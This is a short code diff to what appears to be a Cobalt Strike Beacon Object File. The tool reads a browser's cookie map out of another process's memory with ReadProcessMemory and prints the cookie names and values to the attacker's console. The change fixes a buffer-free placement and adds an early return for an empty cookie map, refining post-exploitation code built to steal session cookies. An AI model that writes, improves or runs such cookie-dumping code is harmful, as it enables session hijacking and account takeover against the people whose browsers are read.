@@ -121,7 +121,6 @@ extern "C" {
         ReadString(hProcess, node.key, &buffer);
 
         BeaconPrintf(CALLBACK_OUTPUT, "%s\n\n", BeaconFormatToString(&buffer, NULL));
-        BeaconFormatFree(&buffer);
 
 #ifdef _DEBUG
         BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
@@ -145,6 +144,7 @@ extern "C" {
             else
                 BeaconPrintf(CALLBACK_ERROR, "Error reading right node! Error: %i\n", GetLastError());
         }
+        BeaconFormatFree(&buffer);
     }
 
     void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress) {
@@ -162,7 +162,13 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "Size of the cookie map: %zu\n", cookieMap.size);
 #endif
 
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %zu\n\n", cookieMap.size);
+        if (cookieMap.firstNode == 0) //CookieMap was empty
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "This CookieMap was empty\n");
+            return;
+        }
+
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Number of available cookies: %zu\n", cookieMap.size);
         // Process the first node of the binary search tree
         Node firstNode;
         if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
